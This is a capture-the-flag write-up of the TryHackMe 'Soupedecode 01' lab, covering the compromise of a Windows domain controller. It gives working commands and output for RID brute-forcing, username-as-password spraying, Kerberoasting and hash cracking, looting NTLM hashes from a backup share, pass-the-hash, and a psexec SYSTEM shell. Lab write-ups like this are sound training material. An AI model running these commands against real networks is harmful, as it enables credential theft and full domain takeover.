# TryHackMe — SOUPEDECODE 01 Writeup

**Target:** `10.49.176.52` (DC01.SOUPEDECODE.LOCAL)
**Domain:** SOUPEDECODE.LOCAL
**OS:** Windows Server 2022 (Domain Controller)

---

## 1. Recon — Nmap

Full port scan to get a picture of the domain controller:

```
nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.155.179
```

Key findings — classic DC fingerprint:

```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server
9389/tcp  open  mc-nmf        .NET Message Framing
```

`rdp-ntlm-info` confirms the hostname and domain:

```
Target_Name: SOUPEDECODE
NetBIOS_Computer_Name: DC01
DNS_Domain_Name: SOUPEDECODE.LOCAL
Product_Version: 10.0.20348
```

SMB signing is enabled and required, so relay attacks are off the table.

---

## 2. SMB Share Enumeration

Listed shares with a null session:

```
smbclient -L 10.49.176.52 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backup          Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
Users           Disk      
```

All shares came back `NT_STATUS_ACCESS_DENIED` on a null session, so no anonymous read.

---

## 3. RID Brute-Forcing via Guest

Guest access was enough to walk the domain's RIDs and enumerate every account:

```
nxc smb 10.49.176.52 -u 'guest' -p '' --rid-brute
```

This dumped the full user list — around 2000 accounts including standard AD groups, ~600 randomly generated users, 10 "server" machine accounts (`WebServer$`, `DatabaseServer$`, `FileServer$`, `MailServer$`, `BackupServer$`, `ApplicationServer$`, `PrintServer$`, `ProxyServer$`, `MonitoringServer$`, `CitrixServer$`), 90 `PC-#$` machine accounts, and a handful of service accounts:

```
1133: SOUPEDECODE\file_svc (SidTypeUser)
2163: SOUPEDECODE\firewall_svc (SidTypeUser)
2164: SOUPEDECODE\backup_svc (SidTypeUser)
2165: SOUPEDECODE\web_svc (SidTypeUser)
2166: SOUPEDECODE\monitoring_svc (SidTypeUser)
2168: SOUPEDECODE\admin (SidTypeUser)
```

Extracted all the usernames into `users.txt`.

---

## 4. AS-REP Roasting Attempt

Tried ASREPRoasting against the whole user list first, since it's a cheap check before touching Kerberoasting or spraying:

```
impacket-GetNPUsers SOUPEDECODE.LOCAL/ \
-usersfile users.txt \
-format hashcat \
-dc-ip 10.49.176.52 \
-no-pass \
-outputfile hash.txt
```

No luck — every account had `UF_DONT_REQUIRE_PREAUTH` disabled, so no AS-REP hashes to crack.

---

## 5. Password Spraying — Username as Password

With ~2000 accounts on hand, sprayed each username as its own password:

```
nxc smb 10.49.176.52 -u users.txt -p users.txt --no-bruteforce
```

Got a hit:

```
SMB   10.49.176.52   445   DC01   [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

---

## 6. Kerberoasting

With valid domain creds (`ybob317:ybob317`), Kerberoasted every account with an SPN:

```
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:'ybob317' -dc-ip 10.49.176.52 -request
```

Five service accounts came back with SPNs:

```
ServicePrincipalName    Name             PasswordLastSet
-----------------------  ---------------  --------------------------
FTP/FileServer           file_svc         2024-06-17 23:02:23
FW/ProxyServer           firewall_svc     2024-06-17 22:58:32
HTTP/BackupServer        backup_svc       2024-06-17 22:58:49
HTTP/WebServer           web_svc          2024-06-17 22:59:04
HTTPS/MonitoringServer   monitoring_svc   2024-06-17 22:59:18
```

Saved all five `$krb5tgs$23$...` hashes and cracked them with rockyou:

```
john hash -w=/usr/share/wordlists/rockyou.txt
```

```
Password123!!    (?)     
1g 0:00:00:13 DONE (2026-09-10 22:04) 0.07547g/s 1082Kp/s 5140Kc/s 5140KC/s
```

One of the five cracked — `Password123!!` — for the `file_svc` account.

---

## 7. Backup Share Loot

Logged into SMB as `file_svc` and re-listed shares — this time with actual creds behind it:

```
smbclient -L //10.49.176.52 -U 'file_svc'
```

The `backup` share was readable:

```
smbclient //10.49.176.52/backup -U 'file_svc'
smb: \> ls
  backup_extract.txt   A   892   Mon Jun 17 14:11:05 2024
smb: \> get backup_extract.txt
```

`backup_extract.txt` turned out to be a dumped SAM-style hash list for all ten "server" machine accounts:

```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

---

## 8. Pass-the-Hash

Sprayed all ten NTLM hashes against their matching machine accounts:

```
nxc smb 10.49.176.52 -u bakcup_users -H backup_hash --no-bruteforce
```

`FileServer$` came back with local admin rights:

```
SMB   10.49.176.52   445   DC01   [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

---

## 9. Shell via psexec

Used the `FileServer$` hash to get a SYSTEM shell with impacket-psexec:

```
impacket-psexec 'SOUPEDECODE.LOCAL/FileServer$@10.49.176.52' -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

```
[*] Requesting shares on 10.49.176.52.....
[*] Found writable share ADMIN$
[*] Uploading file uzGPcDCC.exe
[*] Opening SVCManager on 10.49.176.52.....
[*] Creating service PfRr on 10.49.176.52.....
[*] Starting service PfRr.....
Microsoft Windows [Version 10.0.20348.587]
```

---

## 10. Flags

**User flag** — `C:\Users\ybob317\Desktop\user.txt`:

```
C:\Users\ybob317\Desktop> type user.txt
28189316c25dd3c0ad56d44d000d62a8
```

**Root flag** — `C:\Users\Administrator\Desktop\root.txt`:

```
C:\Users\Administrator\Desktop> type root.txt
27cb2be302c388d63d27c86bfdd5f56a
```

---

## Attack Chain Summary

```
Guest SMB access → RID brute-force (2000+ users) → AS-REP roast (no hits)
→ username-as-password spray (ybob317) → Kerberoast (5 SPN accounts)
→ crack file_svc hash → backup share → NTLM hash dump for machine accounts
→ pass-the-hash on FileServer$ (Pwn3d!) → psexec SYSTEM shell → user.txt + root.txt
```
